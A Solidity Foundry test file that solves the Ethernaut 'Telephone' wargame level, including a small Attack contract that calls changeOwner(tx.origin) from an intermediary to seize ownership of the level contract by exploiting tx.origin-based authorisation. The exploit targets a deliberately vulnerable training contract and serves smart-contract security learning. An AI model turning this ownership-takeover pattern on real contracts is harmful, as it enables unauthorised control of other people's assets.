// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Telephone/TelephoneFactory.sol";
import "../src/Ethernaut.sol";

contract TelephoneTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testTelephoneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        TelephoneFactory telephoneFactory = new TelephoneFactory();
        ethernaut.registerLevel(telephoneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(telephoneFactory);
        Telephone ethernautTelephone = Telephone(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack();
        attack.attack(address(ethernautTelephone));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    function attack(address _target) public {
        Telephone(_target).changeOwner(tx.origin);
    }
}
